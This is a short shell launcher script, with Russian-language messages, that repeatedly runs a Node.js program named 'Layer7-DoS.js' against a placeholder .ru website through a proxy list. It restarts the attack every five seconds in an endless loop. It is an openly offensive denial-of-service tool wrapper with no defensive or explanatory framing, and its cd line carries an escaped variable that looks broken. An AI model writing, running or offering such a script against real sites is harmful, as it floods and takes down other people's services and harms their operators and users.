#!/bin/sh
            BINDIR=$(dirname "$(readlink -fn "$0")")
            cd "\$BINDIR"
            while true
            do
                node Layer7-DoS.js https://сайт.ru/ proxies.txt 999
                echo "Чтобы остановить сервер зажмите Ctrl + C!"
                echo "Перезагрузка через:"
                for i in 5 4 3 2 1
                do
                    echo "$i..."
                    sleep 1
                done
                echo "Перезагрузка!"
            done